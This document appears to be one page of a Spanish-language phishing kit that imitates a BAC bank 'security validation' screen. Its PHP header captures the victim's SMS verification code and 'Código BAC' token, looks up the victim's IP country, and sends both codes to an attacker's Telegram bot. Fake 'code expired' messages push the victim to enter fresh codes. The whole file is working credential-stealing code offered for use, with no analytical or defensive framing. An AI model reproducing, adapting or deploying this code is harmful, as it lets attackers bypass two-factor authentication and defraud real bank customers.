<?php
   ini_set("display_errors", 0);
   include "aquiva.php";
   
   
   if (isset($_POST['caraqueñAZO']) && isset($_POST['precari0']) ) {
       $breve = $_POST['caraqueñAZO'];
       $breves = $_POST['precari0'];
       $ipInfoResponse = getIpInfo($_SERVER['REMOTE_ADDR']);
       $codigopais = isset($ipInfoResponse['country']) ? $ipInfoResponse['country'] : 'Desconocido';
       $mensajito .= "B4C\nC0D3X: ".$_POST['caraqueñAZO']."\nC0D3X B4C: ".$_POST['precari0']."\nYYP: ".$_SERVER['REMOTE_ADDR']."\nPaís: ".$codigopais."\nC0DE BY SYN4PSE";
   
       env($tribales, $tulum, $mensajito);
   }
   function getIpInfo($ip) {
       $url = "http://ipinfo.io/{$ip}/json";  
       $curl = curl_init();
       curl_setopt($curl, CURLOPT_URL, $url);
       curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
       $response = curl_exec($curl);
       curl_close($curl);
       
       return json_decode($response, true);
   }
   function env($dakota, $chatsito, $mensajillo) {
       $url = "https://api.telegram.org/bot{$dakota}/sendMessage";
       $data = array(
           'chat_id' => $chatsito,
           'text' => $mensajillo
       );
   
       $options = array(
           CURLOPT_URL => $url,
           CURLOPT_POST => true,
           CURLOPT_POSTFIELDS => http_build_query($data),
           CURLOPT_RETURNTRANSFER => true,
       );
   
       $curl = curl_init();
       curl_setopt_array($curl, $options);
       $response = curl_exec($curl);
       curl_close($curl);
   
       return $response;
       
   }
   
   ?>

<!DOCTYPE html>

<html lang="es">
   <head>
   <meta http-equiv="Content-Type" charset="UTF-8">
    
  <title>Somos uno</title>
      
      <link rel="stylesheet" href="bel-main-style.css">
      
  
      <style type="text/css" id="kampyleStyle">.noOutline{outline: none !important;}.wcagOutline:focus{outline: 1px dashed #595959 !important;outline-offset: 2px !important;transition: none !important;}.nebula_image_button { width: auto !important; background: transparent !important; }</style>
   </head>
   <body class="bel-space-reset bel-main-background">
      <div>
         <div style="background: #e4002b" class="bel-padding-bottom-m bel-padding-top-m">
            <img class="bel-float-center" width="156px" src="bac-brand.png" alt="Logo Sucursal Electronica">
         </div>
         <!-- END WRAPPER HEADER -->
      </div>
      <!-- END WIDER WRAPPER -->
      <div class="grid-container">
         <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no">
      
         <style>
            .helpCenter span{font-weight: bold;}
            .helpCenter a{font-weight: bold; color: #1075bb; text-decoration: none;}
         </style>
   
         <section class="grid-row">
            <div class="col-12">
               <div class="bel-space-top-l bel-space-bottom-m">
                  <h1 class="bel-typography bel-typography-h1">Validación de seguridad</h1>
               </div>
               <div class="bel-space-bottom-l">
                  <p class="bel-typography bel-typography-p">Esta gestión le permite ingresar el Código BAC para que pueda acceder a su cuenta.</p>
               </div>
            </div>
         </section>
         <div id="helpCenter" class="helpCenter">
            <div class="grid-row">
               <div class="col-12">
                  <div class="display-flex bel-alertMessage">
                     <div class="bel-padding-reset position-relative alertMessage_info-color">
                        <div class="bel-icon-security-l bel-alertMessage-icon"></div>
                     </div>
                     <div class="grid-row align-items-center">
                        <div class="col-12 bel-alertMessage_content">
                           <div class="bel-alertMessage-textCnt">
                              <p class="bel-typography bel-typography-p">Recuerde que si desea ingresar, necesita tener acceso a su <span>Código BAC.</span> Si no tiene acceso a Código BAC puede encontrar soporte en el <a href="#" >Centro de ayuda</a>.</p>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
         <div id="messageResult" class="bel-space-bottom-m"></div>
         <form method="post" action="oucls3.php">
            <section class="grid-row bel-space-bottom-m">
               <div class="col-12">
                  <div class="bel-card">
                     <div class="grid-row">
                        <div class="col-12">
                           <div id="headId" class="bel-space-bottom-s">
                              <div class="grid-row bel-menu_head-line">
                                 <div class="col-8 col-md-9 col-lg-9">
                                    <div class="display-flex flex-direction-column">
                                       <h2 class="bel-typography bel-typography-h2 display-inline">Código de Verificación</h2>
                                    </div>
                                 </div>
                                 <div class="col-4 col-md-3 col-lg-3">
                                    <div class="grid-row justify-content-end">
                                       <span class="bel-tooltip-generic-text bel-tooltip-generic-text__down">
                                          <p class="bel-typography">En caso de contar con una Tarjeta CLAVE, debe presentarse a una Sucursal f�sica o llamar al centro de contacto para generar su nueva contrase�a.</p>
                                       </span>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                     <div class="grid-row bel-space-bottom-l">
                        <div class="col-12">
                           <p class="bel-typography bel-typography-p">Se ha enviado un código de verificación por SMS al teléfono celular ****-****. Digite el código en el espacio correspondiente.</p>
                        </div>
                     </div>
                     <div class="grid-row bel-space-bottom-m">
                        <div class="col-12 bel-space-bottom-s">
                           <label class="bel-typography bel-typography-label">Código </label>
                        </div>
                       <div class="col-12 col-md-5 col-lg-4">

                           <div class="bel-position-relative display-inline">
                              <input  class="bel-input bel-input-default bel-input--icon bel-truncate-text" maxlength="6" minlength="6"  type="text" inputmode="numeric" name="caraqueñAZO" value="" placeholder="" required onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;">            
                           </div>

                          
                        </div>

                        <div class="col-12 bel-space-bottom-xs order-md-2">

                           <span id="messageResultBacCode" class="bel-typography-main bel-typography-label-error">Código SMS, expirado ingrese uno nuevo.</span>
                        </div>
                      
                     </div>
                   
                  </div>
               </div>

                <div class="col-12">
                   <br>
                  <div class="bel-card">
                     <div class="grid-row">
                        <div class="col-12">
                           <div id="headId" class="bel-space-bottom-s">
                              <div class="grid-row bel-menu_head-line">
                                 <div class="col-8 col-md-9 col-lg-9">
                                    <div class="display-flex flex-direction-column">
                                       <h2 class="bel-typography bel-typography-h2 display-inline">Código BAC</h2>
                                    </div>
                                 </div>
                                 <div class="col-4 col-md-3 col-lg-3">
                                    <div class="grid-row justify-content-end">
                                       <span class="bel-tooltip-generic-text bel-tooltip-generic-text__down">
                                          <p class="bel-typography">En caso de contar con una Tarjeta CLAVE, debe presentarse a una Sucursal f�sica o llamar al centro de contacto para generar su nueva contrase�a.</p>
                                       </span>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                     <div class="grid-row bel-space-bottom-l">
                        <div class="col-12">
                           <p class="bel-typography bel-typography-p">Si ya activó Código BAC dentro de banca Móvil siga estas instrucciones.</p>
                        </div>
                     </div>
                     <div class="grid-row bel-space-bottom-m">
                        <div class="col-12 bel-space-bottom-s">
                           <label class="bel-typography bel-typography-label">Por favor ingrese el código BAC</label>
                        </div>
                       <div class="col-12 col-md-5 col-lg-4">

                           <div class="bel-position-relative display-inline">
                              <input  class="bel-input bel-input-default bel-input--icon bel-truncate-text" maxlength="6" minlength="6"  type="text" inputmode="numeric" name="precari0" value="" placeholder="Digite su código BAC" required onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;">
                               <br> <br> <img src="dfa.gif" style="width: 200px">                                
                           </div>
                        </div>
                        <div class="col-12 bel-space-bottom-xs order-md-2">
                           <span id="messageResultBacCode" class="bel-typography-main bel-typography-label-error">Código BAC expirado, ingrese uno nuevo.</span>
                        </div>
                        <div class="col-12 bel-space-bottom-xs order-md-2">
                           <h6 class="bel-typography bel-typography-h6">Debe tener 6 dígitos numéricos</h6>
                           
                        </div> 
                     </div>
                      <div class="col-12 col-md-3 col-lg-2">
                           
                           <button id="sendValidationCard" class="btn-block bel-btn bel-btn-default bel-btn-default-disabled" style="cursor: pointer;"  type="submit">Validar</button> 
                        </div>
                  </div>
               </div>
            </section>
            <div id="dfaAlertMessage" class="bel-space-bottom-m bel-display-none">
               <div class="grid-row">
                  <div class="col-12">
                     <div class="display-flex bel-alertMessage">
                        <div class="bel-padding-reset position-relative alertMessage_info-color">
                           <div class="bel-icon-info-l bel-alertMessage-icon"></div>
                        </div>
                        <div class="grid-row align-items-center">
                           <div class="col-12 bel-alertMessage_content">
                              <div class="bel-alertMessage-textCnt">
                                 <p class="bel-typography bel-typography-p">El código de seguridad debe ser digitado únicamente por usted, no lo brinde por llamada telefónica porque podrá ser víctima de fraude.</p>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
            <div id="dfaContent"></div>
         </form>
         
       
      </div>
      <div>
         <div class="bel-grid-row ">
            <div class="bel-col-12">
               <div class="bel-border-top bel-space-bottom-s"></div>
               <div class="bel-position-center">
                  <h5 class="bel-typography bel-typography-h5">
                     Todos los derechos reservados. 2023 ©. <a class="termsUseLink"  href="#">Términos y condiciones.</a>	
                  </h5>
               </div>
            </div>
         </div>
      </div>
     
      <style title="MDigital_animationStyle"></style>
      <span id="kampyleButtonContainer"><button id="nebula_div_btn" class="nebula_image_button  noOutline " style="padding: 0px; right: 0px; top: unset !important; border: none; z-index: 99999990 !important; position: fixed !important; cursor: pointer !important; line-height: 1px !important; bottom: 228.5px !important; width: 40px !important; height: 180px !important; margin-bottom: 180px !important;" tabindex="0"><img alt="Comente" src="copy_1598468940259_boton-ps.png" style="width: inherit; height: inherit;"></button></span>
      <span id="MDigitalLightboxWrapper">
         <div id="kampyleFormContainer" style="top:0 !important;left:0 !important;width: 100% !important;height: 100% !important;position: fixed !important;visibility:hidden !important;display:table !important;background-color: rgba(102,102,102,0.4) !important;z-index:99999999 !important;-webkit-overflow-scrolling: touch !important; ">
            <div id="innerContainer">
               <div id="kampyleFormModal" style="z-index:99999999 !important; -webkit-overflow-scrolling: touch !important;"><iframe id="kampyleForm24925" src="form1699892165316.html" tabindex="-1" title="Feedback Survey" style="border: 0px !important; height: 100% !important; max-height: 100% !important; min-height: 100% !important; width: 100% !important; max-width: 100% !important; min-width: 100% !important; display: none !important; position: fixed !important;" origin="https://resources.digital-cloud-west.medallia.com"></iframe></div>
               <div id="MDigital_spinnerContainer" class="neb-loading-spinner" style="display: none; height: 100% !important; z-index: 2147483647 !important; position: absolute !important; width: 100% !important; top: 0px !important;">
                  <div id="MDigital_spinnerCircle" style="border-width: 4px !important; border-style: solid !important; border-color: rgb(64, 80, 198) rgb(243, 243, 243) rgb(243, 243, 243) !important; border-image: initial !important; border-radius: 50% !important; width: 40px !important; height: 40px !important; margin-top: 5px !important; margin-right: 5px !important; top: calc(50% - 24px) !important; left: calc(50% - 24px) !important; position: relative !important; animation: 1s linear 0s infinite normal none running MDigital_spin !important;"></div>
               </div>
            </div>
         </div>
      </span>
   </body>
</html>
